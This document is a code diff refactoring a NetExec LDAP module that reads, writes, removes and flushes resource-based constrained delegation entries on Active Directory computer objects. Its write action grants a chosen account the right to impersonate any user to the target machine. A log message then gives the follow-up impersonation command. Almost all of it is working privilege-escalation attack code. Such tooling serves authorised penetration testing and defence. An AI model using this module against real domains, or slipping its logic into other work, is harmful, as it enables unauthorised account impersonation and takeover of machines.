@@ -4,8 +4,6 @@ from impacket.ldap.ldapasn1 import SDFlagsControl
 from nxc.helpers.misc import CATEGORY
 from nxc.parsers.ldap_results import parse_result_attributes
 
-VALID_ACTIONS = ("read", "write", "remove")
-
 
 class NXCModule:
     """
@@ -22,136 +20,171 @@ class NXCModule:
     supported_protocols = ["ldap"]
     category = CATEGORY.PRIVILEGE_ESCALATION
 
-    def __init__(self):
-        self.context = None
-        self.module_options = None
-        self.delegate_to = None
-        self.delegate_from = None
-        self.action = "read"
-        self._valid = False
+    VALID_ACTIONS = ("read", "write", "remove", "flush")
+    RBCD_ATTRIBUTE = "msDS-AllowedToActOnBehalfOfOtherIdentity"
 
     def options(self, context, module_options):
         """
+        ACTION          read/write/remove/flush (default: read)
         DELEGATE_TO     Computer account to configure RBCD on (e.g., TARGET$)
-        ACTION          read/write/remove (default: read)
-        DELEGATE_FROM   SID or sAMAccountName of account to allow delegation (required for write)
+        DELEGATE_FROM   SID or sAMAccountName of the account to allow delegation (required for write and remove)
         """
+        self.action = module_options.get("ACTION", "read").lower()
         self.delegate_to = module_options.get("DELEGATE_TO")
         self.delegate_from = module_options.get("DELEGATE_FROM")
-        self.action = module_options.get("ACTION", "read").lower()
 
+        if self.action not in self.VALID_ACTIONS:
+            context.log.fail(f"Invalid ACTION '{self.action}'. Use one of: {', '.join(self.VALID_ACTIONS)}")
+            return False
         if not self.delegate_to:
             context.log.fail("DELEGATE_TO option is required")
-            return
-        if self.action not in VALID_ACTIONS:
-            context.log.fail(f"Invalid ACTION '{self.action}'. Use one of: {', '.join(VALID_ACTIONS)}")
-            return
-        if self.action == "write" and not self.delegate_from:
-            context.log.fail("DELEGATE_FROM option is required for write action")
-            return
-        self._valid = True
+            return False
+        if self.action in ("write", "remove") and not self.delegate_from:
+            context.log.fail(f"DELEGATE_FROM option is required for the {self.action} action. Use ACTION=flush to clear every delegation entry on the target")
+            return False
 
     def on_login(self, context, connection):
-        if not self._valid:
-            return
-        if self.action == "read":
-            self.read_rbcd(context, connection)
-        elif self.action == "write":
-            self.write_rbcd(context, connection)
-        elif self.action == "remove":
-            self.remove_rbcd(context, connection)
+        self.context = context
+        self.connection = connection
 
-    def read_rbcd(self, context, connection):
-        """Read and display current RBCD configuration on the target"""
-        target_entry = self.get_target_object(context, connection, self.delegate_to)
+        target_entry = self.get_target_object(self.delegate_to)
         if not target_entry:
             return
 
-        rbcd_data = target_entry.get("msDS-AllowedToActOnBehalfOfOtherIdentity")
+        if self.action == "read":
+            self.read_rbcd(target_entry)
+        elif self.action == "write":
+            self.write_rbcd(target_entry)
+        elif self.action == "remove":
+            self.remove_rbcd(target_entry)
+        elif self.action == "flush":
+            self.flush_rbcd(target_entry)
+
+    def get_target_object(self, sam_account_name):
+        """Look up an object by sAMAccountName, return parsed entry with SD attributes"""
+        sam = sam_account_name if sam_account_name.endswith("$") else f"{sam_account_name}$"
+        resp = self.connection.search(
+            searchFilter=f"(sAMAccountName={sam})",
+            attributes=["distinguishedName", "objectSid", "sAMAccountName", self.RBCD_ATTRIBUTE],
+            searchControls=[SDFlagsControl(criticality=True, flags=0x05)],
+        )
+        entries = parse_result_attributes(resp)
+        if not entries:
+            self.context.log.fail(f"Target object not found: {sam}")
+            return None
+        return entries[0]
+
+    def read_rbcd(self, target_entry):
+        """Read and display current RBCD configuration on the target"""
+        rbcd_data = target_entry.get(self.RBCD_ATTRIBUTE)
         if not rbcd_data:
-            context.log.display(f"No RBCD configured on {self.delegate_to}")
+            self.context.log.display(f"No RBCD configured on {self.delegate_to}")
             return
 
         sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=bytes(rbcd_data))
         if not sd["Dacl"] or len(sd["Dacl"].aces) == 0:
-            context.log.display(f"RBCD attribute exists but DACL is empty on {self.delegate_to}")
+            self.context.log.display(f"RBCD attribute exists but DACL is empty on {self.delegate_to}")
             return
 
-        context.log.success(f"Found {len(sd['Dacl'].aces)} delegation entries on {self.delegate_to}:")
+        self.context.log.success(f"Found {len(sd['Dacl'].aces)} delegation entries on {self.delegate_to}:")
         for ace in sd["Dacl"].aces:
             sid = ace["Ace"]["Sid"].formatCanonical()
-            name = self.resolve_sid(connection, sid)
-            context.log.highlight(f"  {name} ({sid})")
+            self.context.log.highlight(f"  {self.resolve_sid(sid)} ({sid})")
 
-    def get_target_object(self, context, connection, sam_account_name):
-        """Look up an object by sAMAccountName, return parsed entry with SD attributes"""
-        sam = sam_account_name if sam_account_name.endswith("$") else f"{sam_account_name}$"
-        search_filter = f"(sAMAccountName={sam})"
-        controls = [SDFlagsControl(criticality=True, flags=0x05)]
-        resp = connection.search(
-            searchFilter=search_filter,
-            attributes=["distinguishedName", "objectSid", "sAMAccountName", "msDS-AllowedToActOnBehalfOfOtherIdentity"],
-            searchControls=controls,
-        )
-        entries = parse_result_attributes(resp)
-        if not entries:
-            context.log.fail(f"Target object not found: {sam}")
-            return None
-        return entries[0]
-
-    def resolve_sid(self, connection, sid):
+    def resolve_sid(self, sid):
         """Resolve a SID to sAMAccountName via LDAP, fall back to SID string on failure"""
-        resp = connection.search(searchFilter=f"(objectSid={sid})", attributes=["sAMAccountName"])
-        entries = parse_result_attributes(resp)
-        if entries and entries[0].get("sAMAccountName"):
-            return entries[0]["sAMAccountName"]
-        return sid
+        entries = parse_result_attributes(self.connection.search(searchFilter=f"(objectSid={sid})", attributes=["sAMAccountName"]))
+        return entries[0]["sAMAccountName"] if entries and entries[0].get("sAMAccountName") else sid
 
-    def write_rbcd(self, context, connection):
+    def get_sid_for_principal(self, principal):
+        """Accept either a SID (S-1-5-...) or a sAMAccountName, return the SID string"""
+        if principal.upper().startswith("S-1-"):
+            return principal
+
+        entries = parse_result_attributes(self.connection.search(searchFilter=f"(sAMAccountName={principal})", attributes=["objectSid", "sAMAccountName"]))
+        if not entries or not entries[0].get("objectSid"):
+            sam_with_dollar = principal if principal.endswith("$") else f"{principal}$"
+            entries = parse_result_attributes(self.connection.search(searchFilter=f"(sAMAccountName={sam_with_dollar})", attributes=["objectSid", "sAMAccountName"]))
+            if not entries or not entries[0].get("objectSid"):
+                self.context.log.fail(f"Could not resolve principal: {principal}")
+                return None
+        return entries[0]["objectSid"]
+
+    def write_rbcd(self, target_entry):
         """Write RBCD: add DELEGATE_FROM's SID to the target's allowed delegation list"""
-        target_entry = self.get_target_object(context, connection, self.delegate_to)
-        if not target_entry:
-            return
-
-        from_sid = self.get_sid_for_principal(context, connection, self.delegate_from)
+        from_sid = self.get_sid_for_principal(self.delegate_from)
         if not from_sid:
             return
 
-        rbcd_data = target_entry.get("msDS-AllowedToActOnBehalfOfOtherIdentity")
+        rbcd_data = target_entry.get(self.RBCD_ATTRIBUTE)
         if rbcd_data:
             sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=bytes(rbcd_data))
-            existing_sids = [ace["Ace"]["Sid"].formatCanonical() for ace in sd["Dacl"].aces]
-            if from_sid in existing_sids:
-                context.log.display(f"{self.delegate_from} ({from_sid}) is already allowed to delegate to {self.delegate_to}")
+            if from_sid in [ace["Ace"]["Sid"].formatCanonical() for ace in sd["Dacl"].aces]:
+                self.context.log.display(f"{self.delegate_from} ({from_sid}) is already allowed to delegate to {self.delegate_to}")
                 return
         else:
             sd = self.create_empty_sd()
 
         sd["Dacl"].aces.append(self.create_allow_ace(from_sid))
-        target_dn = target_entry["distinguishedName"]
-        try:
-            connection.ldap_connection.modify(target_dn, {"msDS-AllowedToActOnBehalfOfOtherIdentity": [(MODIFY_REPLACE, sd.getData())]})
+        if self.modify_rbcd(target_entry["distinguishedName"], (MODIFY_REPLACE, sd.getData())):
             principal_label = self.delegate_from if self.delegate_from == from_sid else f"{self.delegate_from} ({from_sid})"
-            context.log.success(f"RBCD configured: {principal_label} can now impersonate users to {self.delegate_to}")
-            context.log.display("Use impacket's getST.py with -impersonate to obtain a service ticket as any user")
+            self.context.log.success(f"RBCD configured: {principal_label} can now impersonate users to {self.delegate_to}")
+            self.context.log.display(f"Impersonate with: nxc smb {self.delegate_to.rstrip('$')} -u '{self.delegate_from}' -p <password> --delegate <user to impersonate>")
+
+    def remove_rbcd(self, target_entry):
+        """Remove RBCD: drop DELEGATE_FROM's ACE from the target's allowed delegation list"""
+        rbcd_data = target_entry.get(self.RBCD_ATTRIBUTE)
+        if not rbcd_data:
+            self.context.log.display(f"No RBCD configured on {self.delegate_to}, nothing to remove")
+            return
+
+        from_sid = self.get_sid_for_principal(self.delegate_from)
+        if not from_sid:
+            return
+
+        sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=bytes(rbcd_data))
+        original_count = len(sd["Dacl"].aces)
+        sd["Dacl"].aces = [ace for ace in sd["Dacl"].aces if ace["Ace"]["Sid"].formatCanonical() != from_sid]
+        if len(sd["Dacl"].aces) == original_count:
+            self.context.log.display(f"{self.delegate_from} ({from_sid}) was not in the delegation list of {self.delegate_to}")
+            return
+
+        target_dn = target_entry["distinguishedName"]
+        # AD does not keep an empty SD on this attribute, so drop it entirely once the last entry is gone
+        if not sd["Dacl"].aces:
+            if self.modify_rbcd(target_dn, (MODIFY_DELETE, [])):
+                self.context.log.success(f"Removed last delegation entry and cleared attribute on {self.delegate_to}")
+        elif self.modify_rbcd(target_dn, (MODIFY_REPLACE, sd.getData())):
+            self.context.log.success(f"Removed {self.delegate_from} from delegation list of {self.delegate_to}")
+
+    def flush_rbcd(self, target_entry):
+        """Flush RBCD: remove every delegation entry by clearing the attribute"""
+        rbcd_data = target_entry.get(self.RBCD_ATTRIBUTE)
+        if not rbcd_data:
+            self.context.log.display(f"No RBCD configured on {self.delegate_to}, nothing to flush")
+            return
+
+        self.context.log.display(f"Flushing all delegation entries on {self.delegate_to}:")
+        for ace in ldaptypes.SR_SECURITY_DESCRIPTOR(data=bytes(rbcd_data))["Dacl"].aces:
+            sid = ace["Ace"]["Sid"].formatCanonical()
+            self.context.log.highlight(f"  {self.resolve_sid(sid)} ({sid})")
+
+        if self.modify_rbcd(target_entry["distinguishedName"], (MODIFY_DELETE, [])):
+            self.context.log.success(f"Cleared all RBCD configuration on {self.delegate_to}")
+
+    def modify_rbcd(self, target_dn, modification):
+        """Apply an LDAP modify to the RBCD attribute, translating common failures into actionable messages"""
+        try:
+            self.connection.ldap_connection.modify(target_dn, {self.RBCD_ATTRIBUTE: [modification]})
         except LDAPSessionError as e:
-            self.handle_modify_error(context, e)
-
-    def get_sid_for_principal(self, context, connection, principal):
-        """Accept either a SID (S-1-5-...) or a sAMAccountName, return the SID string"""
-        if principal.upper().startswith("S-1-"):
-            return principal
-
-        resp = connection.search(searchFilter=f"(sAMAccountName={principal})", attributes=["objectSid", "sAMAccountName"])
-        entries = parse_result_attributes(resp)
-        if not entries or not entries[0].get("objectSid"):
-            sam_with_dollar = principal if principal.endswith("$") else f"{principal}$"
-            resp = connection.search(searchFilter=f"(sAMAccountName={sam_with_dollar})", attributes=["objectSid", "sAMAccountName"])
-            entries = parse_result_attributes(resp)
-            if not entries or not entries[0].get("objectSid"):
-                context.log.fail(f"Could not resolve principal: {principal}")
-                return None
-        return entries[0]["objectSid"]
+            if "insufficientAccessRights" in str(e):
+                self.context.log.fail(f"Insufficient rights to modify {self.delegate_to} - need GenericWrite/GenericAll/WriteDACL on the target")
+            elif "noSuchAttribute" in str(e):
+                self.context.log.fail(f"Attribute does not exist on {self.delegate_to}")
+            else:
+                self.context.log.fail(f"LDAP modify failed: {e}")
+            return False
+        return True
 
     def create_empty_sd(self):
         r"""Build an empty security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity.
@@ -189,54 +222,3 @@ class NXCModule:
         acedata["Sid"].fromCanonical(sid)
         ace["Ace"] = acedata
         return ace
-
-    def remove_rbcd(self, context, connection):
-        """Remove RBCD: clear the attribute, or remove a specific SID if DELEGATE_FROM is set"""
-        target_entry = self.get_target_object(context, connection, self.delegate_to)
-        if not target_entry:
-            return
-
-        rbcd_data = target_entry.get("msDS-AllowedToActOnBehalfOfOtherIdentity")
-        if not rbcd_data:
-            context.log.display(f"No RBCD configured on {self.delegate_to}, nothing to remove")
-            return
-
-        target_dn = target_entry["distinguishedName"]
-
-        if self.delegate_from:
-            from_sid = self.get_sid_for_principal(context, connection, self.delegate_from)
-            if not from_sid:
-                return
-            sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=bytes(rbcd_data))
-            original_count = len(sd["Dacl"].aces)
-            sd["Dacl"].aces = [ace for ace in sd["Dacl"].aces if ace["Ace"]["Sid"].formatCanonical() != from_sid]
-            if len(sd["Dacl"].aces) == original_count:
-                context.log.display(f"{self.delegate_from} ({from_sid}) was not in the delegation list of {self.delegate_to}")
-                return
-
-            try:
-                if len(sd["Dacl"].aces) == 0:
-                    connection.ldap_connection.modify(target_dn, {"msDS-AllowedToActOnBehalfOfOtherIdentity": [(MODIFY_DELETE, [])]})
-                    context.log.success(f"Removed last delegation entry and cleared attribute on {self.delegate_to}")
-                else:
-                    connection.ldap_connection.modify(target_dn, {"msDS-AllowedToActOnBehalfOfOtherIdentity": [(MODIFY_REPLACE, sd.getData())]})
-                    context.log.success(f"Removed {self.delegate_from} from delegation list of {self.delegate_to}")
-            except LDAPSessionError as e:
-                self.handle_modify_error(context, e)
-            return
-
-        try:
-            connection.ldap_connection.modify(target_dn, {"msDS-AllowedToActOnBehalfOfOtherIdentity": [(MODIFY_DELETE, [])]})
-            context.log.success(f"Cleared all RBCD configuration on {self.delegate_to}")
-        except LDAPSessionError as e:
-            self.handle_modify_error(context, e)
-
-    def handle_modify_error(self, context, exc):
-        """Translate common LDAP modify errors into actionable messages"""
-        msg = str(exc)
-        if "insufficientAccessRights" in msg:
-            context.log.fail(f"Insufficient rights to modify {self.delegate_to} - need GenericWrite/GenericAll/WriteDACL on the target")
-        elif "noSuchAttribute" in msg:
-            context.log.fail(f"Attribute does not exist on {self.delegate_to}")
-        else:
-            context.log.fail(f"LDAP modify failed: {exc}")
